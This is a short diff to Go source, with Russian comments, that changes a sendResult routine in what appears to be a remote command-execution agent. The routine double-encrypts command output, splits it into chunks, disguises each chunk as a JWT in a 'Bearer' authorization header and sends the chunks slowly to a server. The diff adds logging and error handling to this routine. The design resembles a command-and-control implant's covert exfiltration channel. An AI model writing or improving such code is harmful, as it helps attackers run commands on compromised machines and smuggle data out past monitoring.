@@ -259,6 +259,7 @@ func (s *Service) execute(cmd string) (string, error) {
 }
 
 // sendResult - отправляет результат выполнения на сервер.
+// Если результат большой, он разбивается на чанки и отправляется последовательно.
 func (s *Service) sendResult(taskID, output, status string) error {
 	result := map[string]interface{}{
 		"task_id": taskID,
@@ -266,11 +267,13 @@ func (s *Service) sendResult(taskID, output, status string) error {
 		"status":  status,
 	}
 
+	// Сериализуем в JSON
 	jsonData, err := json.Marshal(result)
 	if err != nil {
 		return err
 	}
 
+	// Шифруем данные
 	encrypted, err := crypto.Encrypt(jsonData)
 	if err != nil {
 		return err
@@ -287,23 +290,37 @@ func (s *Service) sendResult(taskID, output, status string) error {
 
 	// Разбиваем на чанки
 	chunks, _ := chunk.Split(encrypted, 1024)
+	if len(chunks) == 0 {
+		return fmt.Errorf("failed to split data")
+	}
+
+	log.Printf("[CHUNK] Sending %d chunks", len(chunks))
+
+	// Отправляем каждый чанк
 	for i, c := range chunks {
 		chunkData, err := json.Marshal(c)
 		if err != nil {
 			continue
 		}
+
 		chunkEncrypted, err := crypto.Encrypt(chunkData)
 		if err != nil {
 			continue
 		}
+
 		token, err := jwt.Encode(chunkEncrypted)
 		if err != nil {
 			continue
 		}
-		s.sendChunk("Bearer " + token)
+
+		if err := s.sendChunk("Bearer " + token); err != nil {
+			log.Printf("[ERROR] Failed to send chunk %d/%d: %v", i+1, len(chunks), err)
+			continue
+		}
 		log.Printf("[CHUNK] Sent chunk %d/%d", i+1, len(chunks))
 		time.Sleep(100 * time.Millisecond)
 	}
+
 	return nil
 }
 
